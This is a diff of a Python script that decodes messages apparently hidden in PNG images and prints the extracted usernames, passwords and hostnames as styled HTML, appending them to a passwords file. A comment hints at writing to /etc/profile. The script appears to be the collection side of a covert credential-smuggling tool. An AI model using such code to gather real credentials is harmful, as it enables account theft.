@@ -34,11 +34,16 @@ def getdetails(msg):
 #Main Function
 decode_dir = path.expanduser("images/")
 x=""
+y=""
 for infile in glob.glob(decode_dir+"*.png"):
 	msg = decode(infile)
+	y +="<img src= '" + infile + "' width=500 style='margin:0 auto; width:500px;'/>"
 	if isvalidformat(msg):
 		login = getdetails(msg)
-		x+= "<b>Username</b> :" + login[1] + "<br/><b>Password</b> :" + login[0] + "<br/><b>Hostname:</b>" + login[2] + "<br/><br/>"
+		x+= "<div style='width:500px; margin:0 auto; background:#E6E6E6; padding:10px; border-radius:10px;'><b>Username</b> :" + login[1] + "<br/><b>Password</b> :" + login[0] + "<br/><b>Hostname:</b>" + login[2] + "</div><br/>"
+		y += x
+	else:
+		y += "<div style='width:500px; margin:0 auto; background:#E6E6E6; padding:10px; border-radius:10px;'><b>NO PASSWORD FOUND!</b></div><br/>"
 
 f = open('updated.txt','w+')			# Change file to /etc/profile
 f.write(datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
@@ -46,7 +51,7 @@ f.close()
 passwdfile = open('passwords.html','a')
 passwdfile.write(x)
 passwdfile.close()
-print x
+print y
 
 
 
